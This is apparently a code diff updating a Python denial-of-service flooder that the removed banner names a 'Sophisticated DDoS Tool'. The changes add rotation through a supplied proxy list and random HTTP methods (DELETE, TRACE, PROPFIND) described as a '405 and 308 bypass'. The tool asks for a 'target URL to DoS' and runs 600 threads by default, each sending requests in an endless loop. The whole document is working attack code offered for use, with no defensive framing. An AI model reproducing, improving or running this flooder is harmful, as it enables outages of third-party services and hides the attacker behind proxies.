@@ -8229,79 +8229,65 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 	]		
 			
 
-# Create an unverified SSL context to bypass SSL certificate verification
-ssl_context = ssl._create_unverified_context()
+# HTTP Methods for 405 and 308 Bypass
+BYPASS_METHODS = ['OPTIONS', 'HEAD', 'TRACE', 'PATCH', 'DELETE', 'PROPFIND']  # Advanced methods
 
 class Spammer(threading.Thread):
-    def __init__(self, url, number):
+    def __init__(self, url, number, proxy_list):
         threading.Thread.__init__(self)
         self.url = url + "?" + str(random.randint(0, 99999999)) + "=" + str(random.randint(0, 99999999))
         self.num = number
         self.headers = {
-            'User-Agent': random.choice(ua),
-            'Keep-Alive': random.randint(110, 9960),
-            'Referer': random.choice(ref),
-            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-            'Accept-Encoding': 'gzip;q=0,deflate;q=0',
+            'User-Agent': 'BypassTool',
+            'Keep-Alive': str(random.randint(110, 9960)),
+            'Referer': 'http://example.com',
+            'Accept-Encoding': 'gzip, deflate',
             'Connection': 'Keep-Alive',
-            'Cache-Control': 'no-cache, no-store, must-revalidate',
-            'Cache-directive': 'no-cache',
+            'Cache-Control': 'no-cache',
             'Pragma': 'no-cache',
-            'Upgrade-Insecure-Requests': '1',
         }
-        self.Lock = threading.Lock()
+        self.proxy_list = proxy_list
+        self.lock = threading.Lock()
 
     def request(self):
+        global N
         data = None
-        # Use the local proxy `127.0.0.1:8080`
-        proxy = urllib.request.ProxyHandler({'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
-        opener = urllib.request.build_opener(proxy)
+        with self.lock:  # Ensure atomic operation for N management
+            proxy = self.proxy_list[N]
+            N = (N + 1) % len(self.proxy_list)  # Rotate proxy index
+
+        proxy_handler = urllib.request.ProxyHandler({'http': proxy})
+        opener = urllib.request.build_opener(proxy_handler)
         urllib.request.install_opener(opener)
-        req = urllib.request.Request(self.url, data, self.headers)
-        urllib.request.urlopen(req, context=ssl_context)  # Pass the unverified SSL context
 
-        print(Fore.RED + "0000000000000000000000000000")
-        print(Fore.YELLOW + "DDoS Attack in Progress")
-        print(Fore.RED + "0000000000000000000000000000")
-        print(Style.RESET_ALL, end="")
+        method = random.choice(BYPASS_METHODS)  # Rotate HTTP methods
+        try:
+            req = requests.request(method, self.url, headers=self.headers, timeout=5, allow_redirects=False)
+            print(f"[{method}] {self.url} | Status: {req.status_code}")
 
-        sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | Routing via http://127.0.0.1:8080")
-        sys.stdout.flush()
-        sys.stdout.write("\r")
+            # Advanced 308 Permanent Redirect Bypass
+            if req.status_code == 308 and 'Location' in req.headers:
+                redirect_url = req.headers['Location']
+                print(f"[308 BYPASS] Found permanent redirect to: {redirect_url}")
+                # Send request to the redirected URL using unconventional methods without following the redirect
+                for bypass_method in BYPASS_METHODS:
+                    print(f"[308 BYPASS] Trying {bypass_method} on: {redirect_url}")
+                    bypass_req = requests.request(bypass_method, redirect_url, headers=self.headers, allow_redirects=False)
+                    print(f"[{bypass_method}] {redirect_url} | Status: {bypass_req.status_code}")
+        except Exception as e:
+            print(f"[ERROR] {e} | Proxy: {proxy}")
 
     def run(self):
-        self.Lock.acquire()
-        print("Thread #%4d |" % self.num)
-        self.Lock.release()
-        time.sleep(1)
+        self.lock.acquire()
+        print(f"Thread #{self.num:4d} | Starting")
+        self.lock.release()
         while True:
             try:
                 self.request()
             except Exception as e:
-                print(f"Error: {e}")
-        sys.exit(0)
+                print(f"Error in thread #{self.num}: {e}")
 
-class MainLoop():
-    def __init__(self):
-        if os.name in (
-            "nt", "posix", "mac", "os2", "ce", "java", "riscos", "atheos", "amigaos",
-            "beos", "uwin", "vms", "cygwin", "zos", "aix", "irix", "osf1", "hpux",
-            "sunos", "freebsd", "openbsd", "netbsd", "darwin", "linux", "solaris",
-            "haiku", "aros", "syllable", "skyos", "hurd", "minix", "android", "ios",
-            "qnx", "blackberry", "webos", "windowsphone", "windowsce", "symbian",
-            "microsoft", "dec", "sgi", "hp", "sun", "macintosh", "win32", "posix"
-        ):
-            self.title()
-
-    def title(self):
-        sys.stdout.write("                                                                                          \n")
-        sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
-        sys.stdout.write("             " + "0             Sophisticated DDoS Tool        ""          0\n")
-        sys.stdout.write("             " + "0        By Team sl0ppyr00t                ""              0\n")
-        sys.stdout.write("             " + "0        Press Ctrl+C to stop the attack   ""          0\n")
-        sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
-        sys.stdout.write("\n")
-
+class MainLoop:
     def check_url(self, url):
         if url[:4] == "www.":
             url = "https://" + url
@@ -8312,27 +8298,19 @@ class MainLoop():
         return url
 
     def setup(self):
-        global N, Close, Request, Tot_req
-        print(Fore.RED + "0000000000000000000000000000")
-        print(Fore.YELLOW + "Sophisticated DDoS Tool")
-        print(Fore.RED + "0000000000000000000000000000")
-        print(Style.RESET_ALL)
-
-        # Accept URL without checking if it's online
+        global N
+        N = 0
         url = input('> Enter the target URL to DoS: ')
         url = self.check_url(url)
 
-        while True:
-            try:
-                num_threads = int(input('> Enter the number of threads [600]: ') or '600')
-                break
-            except:
-                print('Invalid input. Please enter a number.')
+        proxy_file = input('> Enter the path to the proxy list: ')
+        with open(proxy_file, 'r') as in_file:
+            proxy_list = [i.strip() for i in in_file.readlines()]
 
+        num_threads = int(input('> Enter the number of threads [600]: ') or '600')
         for i in range(num_threads):
-            Spammer(url, i + 1).start()
+            Spammer(url, i + 1, proxy_list).start()
 
 if __name__ == '__main__':
-    N = 0
     b = MainLoop()
     b.setup()
